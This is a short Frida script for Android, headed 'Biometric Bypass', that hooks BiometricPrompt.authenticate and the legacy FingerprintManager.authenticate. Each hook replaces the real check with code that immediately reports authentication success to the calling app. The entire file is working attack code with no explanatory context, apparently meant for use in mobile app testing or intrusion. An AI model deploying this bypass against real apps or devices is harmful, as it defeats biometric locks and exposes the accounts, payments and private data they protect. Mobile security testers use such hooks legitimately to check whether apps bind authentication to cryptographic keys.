
/* Biometric Bypass */
setTimeout(function () {
    Java.perform(function () {

        /* BiometricPrompt (API 28+) */
        try {
            var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
            BiometricPrompt.authenticate.overload(
                'android.os.CancellationSignal',
                'java.util.concurrent.Executor',
                'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
            ).implementation = function (cancel, executor, callback) {
                console.log('[+] BiometricPrompt.authenticate hooked - triggering success');
                var result = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult').$new(null);
                callback.onAuthenticationSucceeded(result);
            };
        } catch (e) { console.log('[-] BiometricPrompt not found'); }

        /* FingerprintManager (legacy) */
        try {
            var FPM = Java.use('android.hardware.fingerprint.FingerprintManager');
            FPM.authenticate.overload(
                'android.hardware.fingerprint.FingerprintManager$CryptoObject',
                'android.os.CancellationSignal',
                'int',
                'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
                'android.os.Handler'
            ).implementation = function (crypto, cancel, flags, callback, handler) {
                console.log('[+] FingerprintManager.authenticate hooked - triggering success');
                var res = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult').$new(crypto);
                callback.onAuthenticationSucceeded(res);
            };
        } catch (e) { console.log('[-] FingerprintManager not found'); }

        console.log('[+] Biometric Bypass active');
    });
}, 0);
